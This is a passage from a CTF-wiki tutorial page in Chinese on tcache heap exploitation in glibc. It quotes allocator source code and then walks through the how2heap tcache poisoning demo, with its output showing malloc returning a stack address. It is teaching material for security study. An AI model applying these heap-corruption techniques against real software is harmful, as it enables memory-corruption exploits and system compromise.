    <nav class="md-nav" aria-label="Challenge 4 : HITCON 2019 one_punch_man">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    基本信息
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    利用思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    利用步骤
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#0x06" class="md-nav__link">
    0x06 建议习题：
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/tcache_attack-zh.md" title="编辑此页" class="md-content__button md-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
                  </a>
                
                
                  <h1>Tcache Attack</h1>
                
                <p><a href="./tcache_attack.md">EN</a> | <a href="./">ZH</a></p>
<h2 id="tcache-makes-heap-exploitation-easy-again">tcache makes heap exploitation easy again<a class="headerlink" href="#tcache-makes-heap-exploitation-easy-again" title="Permanent link">&para;</a></h2>
<h3 id="0x01-tcache-overview">0x01 Tcache overview<a class="headerlink" href="#0x01-tcache-overview" title="Permanent link">&para;</a></h3>
<p>在 tcache 中新增了两个结构体，分别是 tcache_entry 和 tcache_perthread_struct</p>
<div class="highlight"><pre><span></span><code><span class="cm">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">tcache_entry</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="nc">tcache_entry</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
<span class="p">}</span> <span class="n">tcache_entry</span><span class="p">;</span>

<span class="cm">/* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">tcache_perthread_struct</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">counts</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">entries</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>
<span class="p">}</span> <span class="n">tcache_perthread_struct</span><span class="p">;</span>

<span class="k">static</span> <span class="n">__thread</span> <span class="n">tcache_perthread_struct</span> <span class="o">*</span><span class="n">tcache</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</code></pre></div>
<p>其中有两个重要的函数， <code>tcache_get()</code> 和 <code>tcache_put()</code>:</p>
<div class="highlight"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span>
<span class="n">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
  <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
  <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span>
<span class="n">tcache_get</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
  <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>这两个函数会在函数 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173">_int_free</a> 和 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051">__libc_malloc</a> 的开头被调用，其中 <code>tcache_put</code> 当所请求的分配大小不大于<code>0x408</code>并且当给定大小的 tcache bin 未满时调用。一个tcache bin中的最大块数<code>mp_.tcache_count</code>是<code>7</code>。</p>
<div class="highlight"><pre><span></span><code><span class="cm">/* This is another arbitrary limit, which tunables can change.  Each</span>
<span class="cm">   tcache bin will hold at most this number of chunks.  */</span>
<span class="cp"># define TCACHE_FILL_COUNT 7</span>
<span class="cp">#endif</span>
</code></pre></div>
<p>再复习一遍 <code>tcache_get()</code> 的源码</p>
<p><div class="highlight"><pre><span></span><code><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span> <span class="o">*</span>
<span class="n">tcache_get</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
  <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
  <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
在 <code>tcache_get</code> 中，仅仅检查了 <strong>tc_idx</strong> ，此外，我们可以将 tcache 当作一个类似于 fastbin 的单独链表，只是它的check，并没有 fastbin 那么复杂，仅仅检查 <code>tcache-&gt;entries[tc_idx] = e-&gt;next;</code></p>
<h3 id="0x02-tcache-usage">0x02 Tcache Usage<a class="headerlink" href="#0x02-tcache-usage" title="Permanent link">&para;</a></h3>
<ul>
<li>内存释放：</li>
</ul>
<p>可以看到，在free函数的最先处理部分，首先是检查释放块是否页对齐及前后堆块的释放情况，便优先放入tcache结构中。</p>
<div class="highlight"><pre><span></span><code><span class="n">_int_free</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">,</span> <span class="kt">int</span> <span class="n">have_lock</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">INTERNAL_SIZE_T</span> <span class="n">size</span><span class="p">;</span>        <span class="cm">/* its size */</span>
  <span class="n">mfastbinptr</span> <span class="o">*</span><span class="n">fb</span><span class="p">;</span>             <span class="cm">/* associated fastbin */</span>
  <span class="n">mchunkptr</span> <span class="n">nextchunk</span><span class="p">;</span>         <span class="cm">/* next contiguous chunk */</span>
  <span class="n">INTERNAL_SIZE_T</span> <span class="n">nextsize</span><span class="p">;</span>    <span class="cm">/* its size */</span>
  <span class="kt">int</span> <span class="n">nextinuse</span><span class="p">;</span>               <span class="cm">/* true if nextchunk is used */</span>
  <span class="n">INTERNAL_SIZE_T</span> <span class="n">prevsize</span><span class="p">;</span>    <span class="cm">/* size of previous contiguous chunk */</span>
  <span class="n">mchunkptr</span> <span class="n">bck</span><span class="p">;</span>               <span class="cm">/* misc temp for linking */</span>
  <span class="n">mchunkptr</span> <span class="n">fwd</span><span class="p">;</span>               <span class="cm">/* misc temp for linking */</span>

  <span class="n">size</span> <span class="o">=</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>

  <span class="cm">/* Little security check which won&#39;t hurt performance: the</span>
<span class="cm">     allocator never wrapps around at the end of the address space.</span>
<span class="cm">     Therefore we can exclude some size values which might appear</span>
<span class="cm">     here by accident or by &quot;design&quot; from some intruder.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">((</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">p</span> <span class="o">&gt;</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="o">-</span><span class="n">size</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
      <span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">misaligned_chunk</span> <span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="mi">0</span><span class="p">))</span>
    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;free(): invalid pointer&quot;</span><span class="p">);</span>
  <span class="cm">/* We know that each chunk is at least MINSIZE bytes in size or a</span>
<span class="cm">     multiple of MALLOC_ALIGNMENT.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;</span> <span class="n">MINSIZE</span> <span class="o">||</span> <span class="o">!</span><span class="n">aligned_OK</span> <span class="p">(</span><span class="n">size</span><span class="p">)))</span>
    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;free(): invalid size&quot;</span><span class="p">);</span>

  <span class="n">check_inuse_chunk</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>

<span class="cp">#if USE_TCACHE</span>
  <span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span>
      <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span>
      <span class="o">&amp;&amp;</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span><span class="p">)</span>
      <span class="p">{</span>
        <span class="n">tcache_put</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
      <span class="p">}</span>
  <span class="p">}</span>
<span class="cp">#endif</span>

<span class="p">......</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>内存申请：</li>
</ul>
<p>在内存分配的malloc函数中有多处，会将内存块移入tcache中。</p>
<p>（1）首先，申请的内存块符合fastbin大小时并且在fastbin内找到可用的空闲块时，会把该fastbin链上的其他内存块放入tcache中。</p>
<p>（2）其次，申请的内存块符合smallbin大小时并且在smallbin内找到可用的空闲块时，会把该smallbin链上的其他内存块放入tcache中。</p>
<p>（3）当在unsorted bin链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到tcache中，继续处理。</p>
<p>代码太长就不全贴了，贴个符合fastbin 的时候</p>
<div class="highlight"><pre><span></span><code>  <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">get_max_fast</span> <span class="p">()))</span>
    <span class="p">{</span>
      <span class="n">idx</span> <span class="o">=</span> <span class="n">fastbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
      <span class="n">mfastbinptr</span> <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fastbin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
      <span class="n">mchunkptr</span> <span class="n">pp</span><span class="p">;</span>
      <span class="n">victim</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">;</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">victim</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">SINGLE_THREAD_P</span><span class="p">)</span>
        <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
      <span class="k">else</span>
        <span class="nf">REMOVE_FB</span> <span class="p">(</span><span class="n">fb</span><span class="p">,</span> <span class="n">pp</span><span class="p">,</span> <span class="n">victim</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_likely</span> <span class="p">(</span><span class="n">victim</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">))</span>
        <span class="p">{</span>
          <span class="kt">size_t</span> <span class="n">victim_idx</span> <span class="o">=</span> <span class="n">fastbin_index</span> <span class="p">(</span><span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">));</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">victim_idx</span> <span class="o">!=</span> <span class="n">idx</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
              <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;malloc(): memory corruption (fast)&quot;</span><span class="p">);</span>
          <span class="n">check_remalloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
<span class="cp">#if USE_TCACHE</span>
          <span class="cm">/* While we&#39;re here, if we see other chunks of the same size,</span>
<span class="cm">         stash them in the tcache.  */</span>
          <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span> <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span><span class="p">)</span>
        <span class="p">{</span>
          <span class="n">mchunkptr</span> <span class="n">tc_victim</span><span class="p">;</span>

          <span class="cm">/* While bin not empty and tcache not full, copy chunks.  */</span>
          <span class="k">while</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span>
            <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
            <span class="p">{</span>
              <span class="k">if</span> <span class="p">(</span><span class="n">SINGLE_THREAD_P</span><span class="p">)</span>
               <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="n">tc_victim</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
              <span class="k">else</span>
              <span class="p">{</span>
                <span class="n">REMOVE_FB</span> <span class="p">(</span><span class="n">fb</span><span class="p">,</span> <span class="n">pp</span><span class="p">,</span> <span class="n">tc_victim</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">))</span>
                  <span class="k">break</span><span class="p">;</span>
              <span class="p">}</span>
              <span class="n">tcache_put</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
<span class="cp">#endif</span>
          <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
          <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
          <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div>
<ul>
<li>
<p>tcache 取出：在内存申请的开始部分，首先会判断申请大小块，在tcache是否存在，如果存在就直接从tcache中摘取，否则再使用_int_malloc分配。</p>
</li>
<li>
<p>在循环处理unsorted bin内存块时，如果达到放入unsorted bin块最大数量，会立即返回。默认是0，即不存在上限。</p>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="cp">#if USE_TCACHE</span>
      <span class="cm">/* If we&#39;ve processed as many chunks as we&#39;re allowed while</span>
<span class="cm">   filling the cache, return one of the cached ones.  */</span>
      <span class="o">++</span><span class="n">tcache_unsorted_count</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">return_cached</span>
        <span class="o">&amp;&amp;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_unsorted_limit</span> <span class="o">&gt;</span> <span class="mi">0</span>
        <span class="o">&amp;&amp;</span> <span class="n">tcache_unsorted_count</span> <span class="o">&gt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_unsorted_limit</span><span class="p">)</span>
      <span class="p">{</span>
        <span class="k">return</span> <span class="nf">tcache_get</span> <span class="p">(</span><span class="n">tc_idx</span><span class="p">);</span>
      <span class="p">}</span>
<span class="cp">#endif</span>
</code></pre></div>
<ul>
<li>在循环处理unsorted bin内存块后，如果之前曾放入过tcache块，则会取出一个并返回。</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="cp">#if USE_TCACHE</span>
      <span class="cm">/* If all the small chunks we found ended up cached, return one now.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">return_cached</span><span class="p">)</span>
      <span class="p">{</span>
        <span class="k">return</span> <span class="nf">tcache_get</span> <span class="p">(</span><span class="n">tc_idx</span><span class="p">);</span>
      <span class="p">}</span>
<span class="cp">#endif</span>
</code></pre></div>
<h3 id="0x03-pwn-tcache">0x03 Pwn Tcache<a class="headerlink" href="#0x03-pwn-tcache" title="Permanent link">&para;</a></h3>
<h4 id="tcache-poisoning">tcache poisoning<a class="headerlink" href="#tcache-poisoning" title="Permanent link">&para;</a></h4>
<p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。</p>
<p>以 how2heap 中的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c">tcache_poisoning</a> 为例</p>
<p>看一下源码</p>
<div class="highlight"><pre><span></span><code><span class="n">glibc_2</span><span class="mf">.26</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">bat</span> <span class="n">tcache_poisoning</span><span class="p">.</span><span class="n">c</span>
<span class="err">───────┬─────────────────────────────────────────────────────────────────────────────────</span>
       <span class="err">│</span> <span class="nl">File</span><span class="p">:</span> <span class="n">tcache_poisoning</span><span class="p">.</span><span class="n">c</span>
<span class="err">───────┼─────────────────────────────────────────────────────────────────────────────────</span>
   <span class="mi">1</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
   <span class="mi">2</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
   <span class="mi">3</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdint</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
   <span class="mi">4</span>   <span class="err">│</span> 
   <span class="mi">5</span>   <span class="err">│</span> <span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
   <span class="mi">6</span>   <span class="err">│</span> <span class="p">{</span>
   <span class="mi">7</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This file demonstrates a simple tcache poisoning attack</span>
       <span class="err">│</span>  <span class="n">by</span> <span class="n">tricking</span> <span class="n">malloc</span> <span class="n">into</span><span class="err">\</span><span class="n">n</span><span class="s">&quot;</span>
   <span class="mi">8</span>   <span class="err">│</span>                <span class="s">&quot;returning a pointer to an arbitrary location (in this case, the </span>
       <span class="err">│</span> <span class="n">stack</span><span class="p">).</span><span class="err">\</span><span class="n">n</span><span class="s">&quot;</span>
   <span class="mi">9</span>   <span class="err">│</span>                <span class="s">&quot;The attack is very similar to fastbin corruption attack.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="mi">10</span>   <span class="err">│</span> 
  <span class="mi">11</span>   <span class="err">│</span>         <span class="kt">size_t</span> <span class="n">stack_var</span><span class="p">;</span>
  <span class="mi">12</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;The address we want malloc() to return is %p.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span>
       <span class="err">│</span>  <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack_var</span><span class="p">);</span>
  <span class="mi">13</span>   <span class="err">│</span> 
  <span class="mi">14</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Allocating 1 buffer.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="mi">15</span>   <span class="err">│</span>         <span class="kt">intptr_t</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span>
  <span class="mi">16</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;malloc(128): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
  <span class="mi">17</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Freeing the buffer...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="mi">18</span>   <span class="err">│</span>         <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
  <span class="mi">19</span>   <span class="err">│</span> 
  <span class="mi">20</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now the tcache list has [ %p ].</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
  <span class="mi">21</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;We overwrite the first %lu bytes (fd/next pointer) of t</span>
       <span class="err">│</span> <span class="n">he</span> <span class="n">data</span> <span class="n">at</span> <span class="o">%</span><span class="n">p</span><span class="err">\</span><span class="n">n</span><span class="s">&quot;</span>
  <span class="mi">22</span>   <span class="err">│</span>                 <span class="s">&quot;to point to the location to control (%p).</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">intptr_t</span><span class="p">),</span>
       <span class="err">│</span>  <span class="n">a</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var</span><span class="p">);</span>
  <span class="mi">23</span>   <span class="err">│</span>         <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">intptr_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack_var</span><span class="p">;</span>
  <span class="mi">24</span>   <span class="err">│</span> 
  <span class="mi">25</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;1st malloc(128): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">));</span>
  <span class="mi">26</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now the tcache list has [ %p ].</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stack_var</span><span class="p">);</span>
  <span class="mi">27</span>   <span class="err">│</span> 
  <span class="mi">28</span>   <span class="err">│</span>         <span class="kt">intptr_t</span> <span class="o">*</span><span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span>
  <span class="mi">29</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;2st malloc(128): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
  <span class="mi">30</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;We got the control</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="mi">31</span>   <span class="err">│</span> 
  <span class="mi">32</span>   <span class="err">│</span>         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="mi">33</span>   <span class="err">│</span> <span class="p">}</span>
<span class="err">───────┴─────────────────────────────────────────────────────────────────────────────────</span>
</code></pre></div>
<p>运行结果是
<div class="highlight"><pre><span></span><code>glibc_2.26 <span class="o">[</span>master●<span class="o">]</span> ./tcache_poisoning 
This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location <span class="o">(</span>in this <span class="k">case</span>, the stack<span class="o">)</span>.
The attack is very similar to fastbin corruption attack.

The address we want malloc<span class="o">()</span> to <span class="k">return</span> is 0x7fff0d28a0c8.
Allocating <span class="m">1</span> buffer.
malloc<span class="o">(</span><span class="m">128</span><span class="o">)</span>: 0x55f666ee1260
Freeing the buffer...
Now the tcache list has <span class="o">[</span> 0x55f666ee1260 <span class="o">]</span>.
We overwrite the first <span class="m">8</span> bytes <span class="o">(</span>fd/next pointer<span class="o">)</span> of the data at 0x55f666ee1260
to point to the location to control <span class="o">(</span>0x7fff0d28a0c8<span class="o">)</span>.
1st malloc<span class="o">(</span><span class="m">128</span><span class="o">)</span>: 0x55f666ee1260
Now the tcache list has <span class="o">[</span> 0x7fff0d28a0c8 <span class="o">]</span>.
2st malloc<span class="o">(</span><span class="m">128</span><span class="o">)</span>: 0x7fff0d28a0c8
We got the control
</code></pre></div>
分析一下，程序先申请了一个大小是 128 的 chunk，然后 free。128 在 tcache 的范围内，因此 free 之后该 chunk 被放到了 tcache 中，调试如下：
<div class="highlight"><pre><span></span><code><span class="nf">pwndbg</span><span class="err">&gt;</span> 
